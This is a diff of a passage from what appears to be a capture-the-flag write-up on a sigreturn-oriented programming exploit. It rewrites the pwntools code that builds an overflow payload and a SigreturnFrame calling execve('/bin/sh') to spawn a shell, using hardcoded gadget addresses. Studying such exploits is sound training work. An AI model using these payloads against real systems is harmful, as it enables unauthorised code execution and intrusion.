@@ -35,22 +35,27 @@ Now that we have this, we can craft the `SROP` chain.
 We want to execute system("/bin/sh") but in assembly language it is execve("/bin/sh", argument, env ) function.
 ```python
 # Srop
-frame     = SigreturnFrame()
-frame.rax = 0x3b            # syscall number for execve
-frame.rdi = binsh           # pointer to /bin/sh
-frame.rsi = 0x0             # NULL - second argument
-frame.rdx = 0x0             # NULL - third argument
-frame.rip = rop.syscall[0]  # the next command execute
+POP_RAX =0x0043018
+SYSCALL_RET=0x043015
+BINSH = elf.address + 0x1238
 ```
 
 After crafting the `frame`, we send the payload to trigger the vulnerability and get shell.
 
 ```python
-pl  = b'deadbeef'
-pl += p64(rop.rax[0])
-pl += p64(0xf)
-pl += p64(rop.syscall[0])
-pl += bytes(frame)
+payload = b'a'*0x8
+payload += p64(POP_RAX)
+payload += p64(0xf)
+payload += p64(SYSCALL_RET)
+
+frame = SigreturnFrame()
+frame.rax = 0x3b           
+frame.rdi = BINSH          
+frame.rsi = 0x0             
+frame.rdx = 0x0 
+frame.rip = SYSCALL_RET   
+
+payload += bytes(frame)
 ```
 
 Running solver remotely at IP port
